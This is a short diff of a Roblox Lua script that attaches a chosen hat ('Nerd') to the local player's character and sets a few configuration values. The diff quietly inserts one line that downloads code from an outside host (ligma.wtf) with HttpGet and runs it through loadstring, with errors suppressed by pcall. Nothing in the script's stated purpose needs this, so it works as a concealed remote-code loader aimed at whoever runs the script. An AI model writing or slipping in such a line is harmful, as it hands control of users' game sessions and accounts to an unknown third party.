@@ -1,7 +1,7 @@
 --// set this as u want
 local hat = "Nerd" --// hat link is https://www.roblox.com/catalog/9120783085/Nerd-Alert but u can set it to a dif hat if u feel
 local debug_prints = false --// prints when something happens ex: when script welds get deleted
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 --// keep these as defualt
 local VER = "1.0.0c"
 local nerd = game:GetService("Players").LocalPlayer.Character:FindFirstChild(hat)
